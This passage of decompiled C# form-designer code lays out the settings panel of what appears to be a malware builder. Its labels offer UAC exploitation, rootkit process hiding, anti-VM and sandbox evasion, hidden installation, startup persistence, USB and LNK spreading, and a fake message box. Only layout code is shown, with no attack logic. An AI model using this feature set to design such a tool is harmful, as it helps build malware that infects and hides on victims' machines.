		Label73.Name = "Label73";
		Label73.Size = new Size(144, 14);
		Label73.TabIndex = 193;
		Label73.Text = "Protect Spreading Folder";
		PictureBox50.Image = (Image)componentResourceManager.GetObject("PictureBox50.Image");
		PictureBox50.Location = new Point(288, 9);
		PictureBox50.Name = "PictureBox50";
		PictureBox50.Size = new Size(48, 30);
		PictureBox50.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox50.TabIndex = 192;
		PictureBox50.TabStop = false;
		Protect_Startup.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Protect_Startup.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Protect_Startup.CheckedState.InnerBorderColor = Color.White;
		Protect_Startup.CheckedState.InnerColor = Color.White;
		Protect_Startup.CheckedState.Parent = Protect_Startup;
		Protect_Startup.Enabled = false;
		Protect_Startup.Location = new Point(344, 15);
		Protect_Startup.Name = "Protect_Startup";
		Protect_Startup.ShadowDecoration.Parent = Protect_Startup;
		Protect_Startup.Size = new Size(35, 20);
		Protect_Startup.TabIndex = 191;
		Protect_Startup.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Protect_Startup.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Protect_Startup.UncheckedState.InnerBorderColor = Color.White;
		Protect_Startup.UncheckedState.InnerColor = Color.White;
		Protect_Startup.UncheckedState.Parent = Protect_Startup;
		Label72.AutoSize = true;
		Label72.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label72.ForeColor = Color.White;
		Label72.Location = new Point(385, 16);
		Label72.Name = "Label72";
		Label72.Size = new Size(128, 14);
		Label72.TabIndex = 190;
		Label72.Text = "Protect Startup Folder";
		PictureBox49.Image = (Image)componentResourceManager.GetObject("PictureBox49.Image");
		PictureBox49.Location = new Point(8, 9);
		PictureBox49.Name = "PictureBox49";
		PictureBox49.Size = new Size(48, 30);
		PictureBox49.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox49.TabIndex = 189;
		PictureBox49.TabStop = false;
		Protect_Install.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Protect_Install.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Protect_Install.CheckedState.InnerBorderColor = Color.White;
		Protect_Install.CheckedState.InnerColor = Color.White;
		Protect_Install.CheckedState.Parent = Protect_Install;
		Protect_Install.Enabled = false;
		Protect_Install.Location = new Point(63, 16);
		Protect_Install.Name = "Protect_Install";
		Protect_Install.ShadowDecoration.Parent = Protect_Install;
		Protect_Install.Size = new Size(35, 20);
		Protect_Install.TabIndex = 188;
		Protect_Install.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Protect_Install.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Protect_Install.UncheckedState.InnerBorderColor = Color.White;
		Protect_Install.UncheckedState.InnerColor = Color.White;
		Protect_Install.UncheckedState.Parent = Protect_Install;
		Label71.AutoSize = true;
		Label71.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label71.ForeColor = Color.White;
		Label71.Location = new Point(104, 17);
		Label71.Name = "Label71";
		Label71.Size = new Size(146, 14);
		Label71.TabIndex = 187;
		Label71.Text = "Protect installation folder";
		Guna2GradientPanel9.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel9.Controls.Add(Label70);
		Guna2GradientPanel9.Controls.Add(PictureBox60);
		Guna2GradientPanel9.Controls.Add(MSG);
		Guna2GradientPanel9.Controls.Add(PictureBox48);
		Guna2GradientPanel9.Controls.Add(PictureBox44);
		Guna2GradientPanel9.Controls.Add(PictureBox59);
		Guna2GradientPanel9.Controls.Add(Rotk);
		Guna2GradientPanel9.Controls.Add(Label68);
		Guna2GradientPanel9.Controls.Add(PictureBox47);
		Guna2GradientPanel9.Controls.Add(Label66);
		Guna2GradientPanel9.Controls.Add(h_file);
		Guna2GradientPanel9.Controls.Add(Hide_install);
		Guna2GradientPanel9.Controls.Add(Label63);
		Guna2GradientPanel9.Controls.Add(PictureBox45);
		Guna2GradientPanel9.Controls.Add(Run_UAC);
		Guna2GradientPanel9.Controls.Add(Label64);
		Guna2GradientPanel9.Controls.Add(PictureBox46);
		Guna2GradientPanel9.Controls.Add(Label65);
		Guna2GradientPanel9.Controls.Add(UAC);
		Guna2GradientPanel9.Controls.Add(PictureBox57);
		Guna2GradientPanel9.Controls.Add(AntiVM);
		Guna2GradientPanel9.Controls.Add(Label67);
		Guna2GradientPanel9.Controls.Add(PictureBox58);
		Guna2GradientPanel9.Controls.Add(Label69);
		Guna2GradientPanel9.Controls.Add(Protect_Process);
		Guna2GradientPanel9.Location = new Point(584, 8);
		Guna2GradientPanel9.Name = "Guna2GradientPanel9";
		Guna2GradientPanel9.ShadowDecoration.Parent = Guna2GradientPanel9;
		Guna2GradientPanel9.Size = new Size(294, 312);
		Guna2GradientPanel9.TabIndex = 107;
		Label70.AutoSize = true;
		Label70.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label70.ForeColor = Color.White;
		Label70.Location = new Point(110, 281);
		Label70.Name = "Label70";
		Label70.Size = new Size(108, 14);
		Label70.TabIndex = 206;
		Label70.Text = "Fake messagebox";
		PictureBox60.Image = (Image)componentResourceManager.GetObject("PictureBox60.Image");
		PictureBox60.Location = new Point(13, 274);
		PictureBox60.Name = "PictureBox60";
		PictureBox60.Size = new Size(48, 30);
		PictureBox60.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox60.TabIndex = 205;
		PictureBox60.TabStop = false;
		MSG.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		MSG.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		MSG.CheckedState.InnerBorderColor = Color.White;
		MSG.CheckedState.InnerColor = Color.White;
		MSG.CheckedState.Parent = MSG;
		MSG.Location = new Point(69, 280);
		MSG.Name = "MSG";
		MSG.ShadowDecoration.Parent = MSG;
		MSG.Size = new Size(35, 20);
		MSG.TabIndex = 204;
		MSG.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		MSG.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		MSG.UncheckedState.InnerBorderColor = Color.White;
		MSG.UncheckedState.InnerColor = Color.White;
		MSG.UncheckedState.Parent = MSG;
		PictureBox48.Image = (Image)componentResourceManager.GetObject("PictureBox48.Image");
		PictureBox48.Location = new Point(256, 235);
		PictureBox48.Name = "PictureBox48";
		PictureBox48.Size = new Size(29, 23);
		PictureBox48.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox48.TabIndex = 203;
		PictureBox48.TabStop = false;
		PictureBox44.Image = (Image)componentResourceManager.GetObject("PictureBox44.Image");
		PictureBox44.Location = new Point(13, 235);
		PictureBox44.Name = "PictureBox44";
		PictureBox44.Size = new Size(48, 30);
		PictureBox44.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox44.TabIndex = 202;
		PictureBox44.TabStop = false;
		PictureBox59.Image = (Image)componentResourceManager.GetObject("PictureBox59.Image");
		PictureBox59.Location = new Point(13, 122);
		PictureBox59.Name = "PictureBox59";
		PictureBox59.Size = new Size(48, 30);
		PictureBox59.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox59.TabIndex = 177;
		PictureBox59.TabStop = false;
		Rotk.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Rotk.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Rotk.CheckedState.InnerBorderColor = Color.White;
		Rotk.CheckedState.InnerColor = Color.White;
		Rotk.CheckedState.Parent = Rotk;
		Rotk.Location = new Point(69, 241);
		Rotk.Name = "Rotk";
		Rotk.ShadowDecoration.Parent = Rotk;
		Rotk.Size = new Size(35, 20);
		Rotk.TabIndex = 200;
		Rotk.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Rotk.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Rotk.UncheckedState.InnerBorderColor = Color.White;
		Rotk.UncheckedState.InnerColor = Color.White;
		Rotk.UncheckedState.Parent = Rotk;
		Label68.AutoSize = true;
		Label68.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label68.ForeColor = Color.White;
		Label68.Location = new Point(110, 129);
		Label68.Name = "Label68";
		Label68.Size = new Size(108, 14);
		Label68.TabIndex = 176;
		Label68.Text = "Hide After Execute";
		PictureBox47.Image = (Image)componentResourceManager.GetObject("PictureBox47.Image");
		PictureBox47.Location = new Point(13, 84);
		PictureBox47.Name = "PictureBox47";
		PictureBox47.Size = new Size(48, 30);
		PictureBox47.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox47.TabIndex = 193;
		PictureBox47.TabStop = false;
		Label66.AutoSize = true;
		Label66.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label66.ForeColor = Color.White;
		Label66.Location = new Point(110, 91);
		Label66.Name = "Label66";
		Label66.Size = new Size(108, 14);
		Label66.TabIndex = 192;
		Label66.Text = "Hidden installation";
		h_file.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		h_file.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		h_file.CheckedState.InnerBorderColor = Color.White;
		h_file.CheckedState.InnerColor = Color.White;
		h_file.CheckedState.Parent = h_file;
		h_file.Location = new Point(69, 128);
		h_file.Name = "h_file";
		h_file.ShadowDecoration.Parent = h_file;
		h_file.Size = new Size(35, 20);
		h_file.TabIndex = 175;
		h_file.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		h_file.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		h_file.UncheckedState.InnerBorderColor = Color.White;
		h_file.UncheckedState.InnerColor = Color.White;
		h_file.UncheckedState.Parent = h_file;
		Hide_install.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Hide_install.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Hide_install.CheckedState.InnerBorderColor = Color.White;
		Hide_install.CheckedState.InnerColor = Color.White;
		Hide_install.CheckedState.Parent = Hide_install;
		Hide_install.Location = new Point(69, 90);
		Hide_install.Name = "Hide_install";
		Hide_install.ShadowDecoration.Parent = Hide_install;
		Hide_install.Size = new Size(35, 20);
		Hide_install.TabIndex = 191;
		Hide_install.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Hide_install.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Hide_install.UncheckedState.InnerBorderColor = Color.White;
		Hide_install.UncheckedState.InnerColor = Color.White;
		Hide_install.UncheckedState.Parent = Hide_install;
		Label63.AutoSize = true;
		Label63.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label63.ForeColor = Color.White;
		Label63.Location = new Point(110, 242);
		Label63.Name = "Label63";
		Label63.Size = new Size(143, 14);
		Label63.TabIndex = 201;
		Label63.Text = "Hidden process - Rootkit";
		PictureBox45.Image = (Image)componentResourceManager.GetObject("PictureBox45.Image");
		PictureBox45.Location = new Point(13, 47);
		PictureBox45.Name = "PictureBox45";
		PictureBox45.Size = new Size(48, 30);
		PictureBox45.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox45.TabIndex = 199;
		PictureBox45.TabStop = false;
		Run_UAC.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Run_UAC.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Run_UAC.CheckedState.InnerBorderColor = Color.White;
		Run_UAC.CheckedState.InnerColor = Color.White;
		Run_UAC.CheckedState.Parent = Run_UAC;
		Run_UAC.Enabled = false;
		Run_UAC.Location = new Point(69, 53);
		Run_UAC.Name = "Run_UAC";
		Run_UAC.ShadowDecoration.Parent = Run_UAC;
		Run_UAC.Size = new Size(35, 20);
		Run_UAC.TabIndex = 197;
		Run_UAC.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Run_UAC.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Run_UAC.UncheckedState.InnerBorderColor = Color.White;
		Run_UAC.UncheckedState.InnerColor = Color.White;
		Run_UAC.UncheckedState.Parent = Run_UAC;
		Label64.AutoSize = true;
		Label64.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label64.ForeColor = Color.White;
		Label64.Location = new Point(110, 54);
		Label64.Name = "Label64";
		Label64.Size = new Size(85, 14);
		Label64.TabIndex = 198;
		Label64.Text = "Run UAC Once";
		PictureBox46.Image = (Image)componentResourceManager.GetObject("PictureBox46.Image");
		PictureBox46.Location = new Point(13, 8);
		PictureBox46.Name = "PictureBox46";
		PictureBox46.Size = new Size(48, 30);
		PictureBox46.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox46.TabIndex = 196;
		PictureBox46.TabStop = false;
		Label65.AutoSize = true;
		Label65.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label65.ForeColor = Color.White;
		Label65.Location = new Point(110, 15);
		Label65.Name = "Label65";
		Label65.Size = new Size(69, 14);
		Label65.TabIndex = 195;
		Label65.Text = "UAC Exploit";
		UAC.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		UAC.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		UAC.CheckedState.InnerBorderColor = Color.White;
		UAC.CheckedState.InnerColor = Color.White;
		UAC.CheckedState.Parent = UAC;
		UAC.Location = new Point(69, 14);
		UAC.Name = "UAC";
		UAC.ShadowDecoration.Parent = UAC;
		UAC.Size = new Size(35, 20);
		UAC.TabIndex = 194;
		UAC.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		UAC.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		UAC.UncheckedState.InnerBorderColor = Color.White;
		UAC.UncheckedState.InnerColor = Color.White;
		UAC.UncheckedState.Parent = UAC;
		PictureBox57.Image = (Image)componentResourceManager.GetObject("PictureBox57.Image");
		PictureBox57.Location = new Point(13, 198);
		PictureBox57.Name = "PictureBox57";
		PictureBox57.Size = new Size(48, 30);
		PictureBox57.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox57.TabIndex = 186;
		PictureBox57.TabStop = false;
		AntiVM.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		AntiVM.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		AntiVM.CheckedState.InnerBorderColor = Color.White;
		AntiVM.CheckedState.InnerColor = Color.White;
		AntiVM.CheckedState.Parent = AntiVM;
		AntiVM.Location = new Point(69, 204);
		AntiVM.Name = "AntiVM";
		AntiVM.ShadowDecoration.Parent = AntiVM;
		AntiVM.Size = new Size(35, 20);
		AntiVM.TabIndex = 184;
		AntiVM.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		AntiVM.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		AntiVM.UncheckedState.InnerBorderColor = Color.White;
		AntiVM.UncheckedState.InnerColor = Color.White;
		AntiVM.UncheckedState.Parent = AntiVM;
		Label67.AutoSize = true;
		Label67.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label67.ForeColor = Color.White;
		Label67.Location = new Point(110, 166);
		Label67.Name = "Label67";
		Label67.Size = new Size(113, 14);
		Label67.TabIndex = 185;
		Label67.Text = "Process Protection";
		PictureBox58.Image = (Image)componentResourceManager.GetObject("PictureBox58.Image");
		PictureBox58.Location = new Point(13, 159);
		PictureBox58.Name = "PictureBox58";
		PictureBox58.Size = new Size(48, 30);
		PictureBox58.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox58.TabIndex = 183;
		PictureBox58.TabStop = false;
		Label69.AutoSize = true;
		Label69.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label69.ForeColor = Color.White;
		Label69.Location = new Point(110, 205);
		Label69.Name = "Label69";
		Label69.Size = new Size(143, 14);
		Label69.TabIndex = 182;
		Label69.Text = "Anti Vmware -Sandboxie";
		Protect_Process.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Protect_Process.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Protect_Process.CheckedState.InnerBorderColor = Color.White;
		Protect_Process.CheckedState.InnerColor = Color.White;
		Protect_Process.CheckedState.Parent = Protect_Process;
		Protect_Process.Location = new Point(69, 165);
		Protect_Process.Name = "Protect_Process";
		Protect_Process.ShadowDecoration.Parent = Protect_Process;
		Protect_Process.Size = new Size(35, 20);
		Protect_Process.TabIndex = 181;
		Protect_Process.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Protect_Process.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Protect_Process.UncheckedState.InnerBorderColor = Color.White;
		Protect_Process.UncheckedState.InnerColor = Color.White;
		Protect_Process.UncheckedState.Parent = Protect_Process;
		Guna2GradientPanel6.BackColor = Color.FromArgb(24, 30, 54);
		Guna2GradientPanel6.Controls.Add(PictureBox56);
		Guna2GradientPanel6.Controls.Add(PictureBox43);
		Guna2GradientPanel6.Controls.Add(Guna2Separator1);
		Guna2GradientPanel6.Controls.Add(USB);
		Guna2GradientPanel6.Controls.Add(PictureBox24);
		Guna2GradientPanel6.Controls.Add(Label62);
		Guna2GradientPanel6.Controls.Add(Run_Explorer);
		Guna2GradientPanel6.Controls.Add(PictureBox38);
		Guna2GradientPanel6.Controls.Add(Label7);
		Guna2GradientPanel6.Controls.Add(Create_lnk);
		Guna2GradientPanel6.Controls.Add(D4);
		Guna2GradientPanel6.Controls.Add(Label49);
		Guna2GradientPanel6.Controls.Add(D6);
		Guna2GradientPanel6.Controls.Add(PictureBox40);
		Guna2GradientPanel6.Controls.Add(Label57);
		Guna2GradientPanel6.Controls.Add(D1);
		Guna2GradientPanel6.Controls.Add(Auto_Startup);
		Guna2GradientPanel6.Controls.Add(D2);
		Guna2GradientPanel6.Controls.Add(PictureBox41);
		Guna2GradientPanel6.Controls.Add(D7);
		Guna2GradientPanel6.Controls.Add(Create_vbs);
		Guna2GradientPanel6.Controls.Add(Label43);
		Guna2GradientPanel6.Controls.Add(Label58);
		Guna2GradientPanel6.Controls.Add(D3);
		Guna2GradientPanel6.Controls.Add(PictureBox54);
		Guna2GradientPanel6.Controls.Add(Install_Payload);
		Guna2GradientPanel6.Controls.Add(PictureBox55);
		Guna2GradientPanel6.Controls.Add(D5);
		Guna2GradientPanel6.Controls.Add(PictureBox53);
		Guna2GradientPanel6.Controls.Add(D8);
		Guna2GradientPanel6.Controls.Add(PictureBox52);
		Guna2GradientPanel6.Controls.Add(Name_Payload);
		Guna2GradientPanel6.Controls.Add(PictureBox42);
		Guna2GradientPanel6.Controls.Add(Name_Folder);
		Guna2GradientPanel6.Controls.Add(Stxt);
		Guna2GradientPanel6.Controls.Add(Szip);
		Guna2GradientPanel6.Controls.Add(Label61);
		Guna2GradientPanel6.Controls.Add(Label37);
		Guna2GradientPanel6.Controls.Add(PictureBox39);
		Guna2GradientPanel6.Controls.Add(PictureBox36);
		Guna2GradientPanel6.Controls.Add(Label53);
		Guna2GradientPanel6.Controls.Add(Label15);
		Guna2GradientPanel6.Controls.Add(Sexe);
		Guna2GradientPanel6.Controls.Add(Srar);
		Guna2GradientPanel6.Controls.Add(PictureBox29);
		Guna2GradientPanel6.Location = new Point(8, 8);
		Guna2GradientPanel6.Name = "Guna2GradientPanel6";
		Guna2GradientPanel6.ShadowDecoration.Parent = Guna2GradientPanel6;
		Guna2GradientPanel6.Size = new Size(572, 312);
		Guna2GradientPanel6.TabIndex = 105;
		PictureBox56.Image = (Image)componentResourceManager.GetObject("PictureBox56.Image");
		PictureBox56.Location = new Point(8, 8);
		PictureBox56.Name = "PictureBox56";
		PictureBox56.Size = new Size(48, 30);
		PictureBox56.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox56.TabIndex = 175;
		PictureBox56.TabStop = false;
		PictureBox43.Image = (Image)componentResourceManager.GetObject("PictureBox43.Image");
		PictureBox43.Location = new Point(288, 122);
		PictureBox43.Name = "PictureBox43";
		PictureBox43.Size = new Size(48, 30);
		PictureBox43.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox43.TabIndex = 174;
		PictureBox43.TabStop = false;
		Guna2Separator1.Location = new Point(12, 255);
		Guna2Separator1.Name = "Guna2Separator1";
		Guna2Separator1.Size = new Size(258, 10);
		Guna2Separator1.TabIndex = 141;
		USB.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		USB.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		USB.CheckedState.InnerBorderColor = Color.White;
		USB.CheckedState.InnerColor = Color.White;
		USB.CheckedState.Parent = USB;
		USB.Location = new Point(344, 128);
		USB.Name = "USB";
		USB.ShadowDecoration.Parent = USB;
		USB.Size = new Size(35, 20);
		USB.TabIndex = 172;
		USB.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		USB.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		USB.UncheckedState.InnerBorderColor = Color.White;
		USB.UncheckedState.InnerColor = Color.White;
		USB.UncheckedState.Parent = USB;
		PictureBox24.Image = (Image)componentResourceManager.GetObject("PictureBox24.Image");
		PictureBox24.Location = new Point(8, 274);
		PictureBox24.Name = "PictureBox24";
		PictureBox24.Size = new Size(48, 30);
		PictureBox24.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox24.TabIndex = 140;
		PictureBox24.TabStop = false;
		Label62.AutoSize = true;
		Label62.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label62.ForeColor = Color.White;
		Label62.Location = new Point(385, 129);
		Label62.Name = "Label62";
		Label62.Size = new Size(70, 14);
		Label62.TabIndex = 173;
		Label62.Text = "USB Spread";
		Run_Explorer.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Run_Explorer.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Run_Explorer.CheckedState.InnerBorderColor = Color.White;
		Run_Explorer.CheckedState.InnerColor = Color.White;
		Run_Explorer.CheckedState.Parent = Run_Explorer;
		Run_Explorer.Enabled = false;
		Run_Explorer.Location = new Point(63, 280);
		Run_Explorer.Name = "Run_Explorer";
		Run_Explorer.ShadowDecoration.Parent = Run_Explorer;
		Run_Explorer.Size = new Size(35, 20);
		Run_Explorer.TabIndex = 138;
		Run_Explorer.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Run_Explorer.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Run_Explorer.UncheckedState.InnerBorderColor = Color.White;
		Run_Explorer.UncheckedState.InnerColor = Color.White;
		Run_Explorer.UncheckedState.Parent = Run_Explorer;
		PictureBox38.Image = (Image)componentResourceManager.GetObject("PictureBox38.Image");
		PictureBox38.Location = new Point(288, 47);
		PictureBox38.Name = "PictureBox38";
		PictureBox38.Size = new Size(48, 30);
		PictureBox38.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox38.TabIndex = 171;
		PictureBox38.TabStop = false;
		Label7.AutoSize = true;
		Label7.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label7.ForeColor = Color.White;
		Label7.Location = new Point(104, 283);
		Label7.Name = "Label7";
		Label7.Size = new Size(135, 14);
		Label7.TabIndex = 139;
		Label7.Text = "Run  Windows explorer";
		Create_lnk.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Create_lnk.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Create_lnk.CheckedState.InnerBorderColor = Color.White;
		Create_lnk.CheckedState.InnerColor = Color.White;
		Create_lnk.CheckedState.Parent = Create_lnk;
		Create_lnk.Enabled = false;
		Create_lnk.Location = new Point(344, 53);
		Create_lnk.Name = "Create_lnk";
		Create_lnk.ShadowDecoration.Parent = Create_lnk;
		Create_lnk.Size = new Size(35, 20);
		Create_lnk.TabIndex = 169;
		Create_lnk.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Create_lnk.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Create_lnk.UncheckedState.InnerBorderColor = Color.White;
		Create_lnk.UncheckedState.InnerColor = Color.White;
		Create_lnk.UncheckedState.Parent = Create_lnk;
		D4.AutoSize = true;
		D4.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		D4.CheckedState.BorderThickness = 0;
		D4.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		D4.CheckedState.InnerColor = Color.WhiteSmoke;
		D4.CheckedState.InnerOffset = -4;
		D4.Cursor = Cursors.Hand;
		D4.Enabled = false;
		D4.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		D4.ForeColor = Color.White;
		D4.Location = new Point(12, 230);
		D4.Name = "D4";
		D4.Size = new Size(70, 19);
		D4.TabIndex = 74;
		D4.Text = "Appdata";
		D4.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		D4.UncheckedState.BorderThickness = 2;
		D4.UncheckedState.FillColor = Color.Transparent;
		D4.UncheckedState.InnerColor = Color.Transparent;
		Label49.AutoSize = true;
		Label49.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label49.ForeColor = Color.White;
		Label49.Location = new Point(385, 54);
		Label49.Name = "Label49";
		Label49.Size = new Size(70, 14);
		Label49.TabIndex = 170;
		Label49.Text = "LNK Sperad";
		D6.AutoSize = true;
		D6.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		D6.CheckedState.BorderThickness = 0;
		D6.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		D6.CheckedState.InnerColor = Color.White;
		D6.CheckedState.InnerOffset = -4;
		D6.Cursor = Cursors.Hand;
		D6.Enabled = false;
		D6.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		D6.ForeColor = Color.White;
		D6.Location = new Point(189, 174);
		D6.Name = "D6";
		D6.Size = new Size(64, 19);
		D6.TabIndex = 104;
		D6.Text = "System";
		D6.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		D6.UncheckedState.BorderThickness = 2;
		D6.UncheckedState.FillColor = Color.Transparent;
		D6.UncheckedState.InnerColor = Color.Transparent;
		PictureBox40.Image = (Image)componentResourceManager.GetObject("PictureBox40.Image");
		PictureBox40.Location = new Point(288, 8);
		PictureBox40.Name = "PictureBox40";
		PictureBox40.Size = new Size(48, 30);
		PictureBox40.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox40.TabIndex = 168;
		PictureBox40.TabStop = false;
		Label57.AutoSize = true;
		Label57.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label57.ForeColor = Color.White;
		Label57.Location = new Point(385, 15);
		Label57.Name = "Label57";
		Label57.Size = new Size(76, 14);
		Label57.TabIndex = 167;
		Label57.Text = "Auto Startup";
		D1.AutoSize = true;
		D1.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		D1.CheckedState.BorderThickness = 0;
		D1.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		D1.CheckedState.InnerColor = Color.White;
		D1.CheckedState.InnerOffset = -4;
		D1.Cursor = Cursors.Hand;
		D1.Enabled = false;
		D1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		D1.ForeColor = Color.White;
		D1.Location = new Point(12, 145);
		D1.Name = "D1";
		D1.Size = new Size(107, 19);
		D1.TabIndex = 45;
		D1.Text = "All Users Profile";
		D1.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		D1.UncheckedState.BorderThickness = 2;
		D1.UncheckedState.FillColor = Color.Transparent;
		D1.UncheckedState.InnerColor = Color.Transparent;
		Auto_Startup.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Auto_Startup.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Auto_Startup.CheckedState.InnerBorderColor = Color.White;
		Auto_Startup.CheckedState.InnerColor = Color.White;
		Auto_Startup.CheckedState.Parent = Auto_Startup;
		Auto_Startup.Location = new Point(344, 14);
		Auto_Startup.Name = "Auto_Startup";
		Auto_Startup.ShadowDecoration.Parent = Auto_Startup;
		Auto_Startup.Size = new Size(35, 20);
		Auto_Startup.TabIndex = 166;
		Auto_Startup.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Auto_Startup.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		Auto_Startup.UncheckedState.InnerBorderColor = Color.White;
		Auto_Startup.UncheckedState.InnerColor = Color.White;
		Auto_Startup.UncheckedState.Parent = Auto_Startup;
		D2.AutoSize = true;
		D2.Checked = true;
		D2.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		D2.CheckedState.BorderThickness = 0;
		D2.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		D2.CheckedState.InnerColor = Color.White;
		D2.CheckedState.InnerOffset = -4;
		D2.Cursor = Cursors.Hand;
		D2.Enabled = false;
		D2.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		D2.ForeColor = Color.White;
		D2.Location = new Point(12, 174);
		D2.Name = "D2";
		D2.Size = new Size(99, 19);
		D2.TabIndex = 101;
		D2.TabStop = true;
		D2.Text = "Program Data";
		D2.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		D2.UncheckedState.BorderThickness = 2;
		D2.UncheckedState.FillColor = Color.Transparent;
		D2.UncheckedState.InnerColor = Color.Transparent;
		PictureBox41.Image = (Image)componentResourceManager.GetObject("PictureBox41.Image");
		PictureBox41.Location = new Point(288, 84);
		PictureBox41.Name = "PictureBox41";
		PictureBox41.Size = new Size(48, 30);
		PictureBox41.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox41.TabIndex = 165;
		PictureBox41.TabStop = false;
		D7.AutoSize = true;
		D7.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		D7.CheckedState.BorderThickness = 0;
		D7.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		D7.CheckedState.InnerColor = Color.White;
		D7.CheckedState.InnerOffset = -4;
		D7.Cursor = Cursors.Hand;
		D7.Enabled = false;
		D7.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		D7.ForeColor = Color.White;
		D7.Location = new Point(189, 202);
		D7.Name = "D7";
		D7.Size = new Size(58, 19);
